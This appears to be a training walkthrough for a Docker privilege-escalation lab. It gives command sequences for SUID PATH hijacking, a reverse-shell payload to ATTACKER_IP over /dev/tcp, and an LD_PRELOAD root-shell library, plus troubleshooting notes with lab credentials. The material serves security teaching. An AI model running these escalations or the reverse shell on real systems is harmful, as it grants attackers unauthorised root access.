STAGE 3: SUID EXPLOITATION
═══════════════════════════════════════════════════════════════════════════════

Find SUID Binaries:
  find /usr/local/bin -perm -4000 -type f
  find / -perm -4000 -type f 2>/dev/null
  ls -la /usr/local/bin/ | grep rwsr

Analyze Binary:
  file /usr/local/bin/run-backup
  strings /usr/local/bin/run-backup
  strings /usr/local/bin/run-backup | grep backup-runner

Create Exploit Directory:
  mkdir -p /tmp/exploit_path
  mkdir -p /tmp/pwn

Create Malicious Binary (Method 1 - Simple):
  cat > /tmp/pwn/backup-runner << 'EOF'
#!/bin/bash
/bin/bash -i
EOF
  chmod +x /tmp/pwn/backup-runner

Create Malicious Binary (Method 2 - Reverse Shell):
  cat > /tmp/pwn/backup-runner << 'EOF'
#!/bin/bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
EOF
  chmod +x /tmp/pwn/backup-runner

Create Malicious Binary (Method 3 - Write File):
  cat > /tmp/pwn/backup-runner << 'EOF'
#!/bin/bash
echo "pwned" > /tmp/pwned_$(date +%s).txt
/bin/bash
EOF
  chmod +x /tmp/pwn/backup-runner

Modify PATH:
  export PATH=/tmp/pwn:$PATH
  echo $PATH

Verify PATH:
  which backup-runner
  type backup-runner

Execute Vulnerable SUID:
  /usr/local/bin/run-backup
  # Should drop to shell as root

Verify Privilege:
  id                      # Check UID
  whoami                  # Should be root

Alternative: LD_PRELOAD Method:
  cat > /tmp/lib.c << 'EOF'
#include <stdlib.h>
#include <unistd.h>
void __attribute__((constructor)) init() {
    setuid(0);
    setgid(0);
    system("/bin/bash");
}
EOF
  gcc -shared -fPIC -o /tmp/lib.so /tmp/lib.c
  LD_PRELOAD=/tmp/lib.so /usr/local/bin/check-user

EXPLOITATION TROUBLESHOOTING
═══════════════════════════════════════════════════════════════════════════════

SSH Connection Issues:
  Q: "Connection refused"
  A: Wait 60 seconds for SSH daemon to start
     Check: docker ps | grep privesc-lab
     Restart: docker restart privesc-lab

SSH Password Issues:
  Q: "Permission denied (publickey,password)"
  A: Verify credentials:
     User: player1
     Pass: password123
  Try: ssh -v -p 2222 player1@localhost

SUID Exploit Not Working:
  Q: "command not found" when running exploit
  A: Ensure PATH is set correctly:
     export PATH=/tmp/pwn:$PATH
     which backup-runner  # Verify
     /usr/local/bin/run-backup  # Use full path for binary

Database Connection Issues:
  Q: "could not connect to server"
  A: Check if PostgreSQL is running:
     docker exec privesc-lab service postgresql status
     Verify credentials in /home/shared/credentials.txt

Sudo Not Working:
  Q: "not in sudoers"
  A: Verify group membership:
     groups  # Should show 'developers'
     Check: cat /etc/sudoers.d/vulnerable
     Ensure you're in developers group

File Permissions Issues:
  Q: "Permission denied" on file read
  A: Check file permissions:
     ls -la /file
     For /home/shared/credentials.txt should be 644 (readable)
